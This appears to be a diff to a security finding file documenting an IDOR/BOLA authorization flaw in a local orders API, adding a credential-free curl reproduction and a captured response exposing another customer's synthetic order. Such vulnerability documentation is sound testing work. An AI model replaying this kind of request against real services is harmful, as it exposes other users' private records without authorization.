@@ -1,13 +1,12 @@
 # V2: Order IDOR/BOLA
 
-Baseline reference: baseline-vulnerable
+Baseline reference: baseline-vulnerable (`cb68a377f5b8cdc3b12f86883ac6fb703ef5e405`)
 Primary mapping: CWE-639: Authorization Bypass Through User-Controlled Key
 
 ## Reproduction request
 
 ```bash
-curl -i http://localhost:5000/api/orders/0000000000000000000000e1 \
-  -H 'Authorization: Bearer CUSTOMER_B_TOKEN'
+curl -i http://localhost:5000/api/orders/0000000000000000000000e1
 ```
 
 ## Baseline source result
@@ -18,4 +17,16 @@ curl -i http://localhost:5000/api/orders/0000000000000000000000e1 \
 
 Impact: The record lookup and delete operation use only the caller-controlled order id and do not constrain the record to the authenticated customer.
 
-This Phase 3 artifact is a reproducible source-level baseline proof. The curl request is the local HTTP reproduction recipe; live response captures are added after the affected local service is started. No live response is claimed by this artifact.
+This Phase 3 artifact is a reproducible source-level baseline proof.
+
+## Live baseline response
+
+Run from the isolated baseline checkout without credentials. The response returned Customer A's order, proving that a caller can retrieve a known object without an authenticated ownership check:
+
+```text
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+{"_id":"0000000000000000000000e1","userId":"00000000-0000-4000-8000-000000000001","totalAmount":2500,"currency":"usd","paymentMethod":"card","status":"pending"}
+```
+
+The full response contained only the synthetic order fixture. Identifiers and customer data are synthetic.
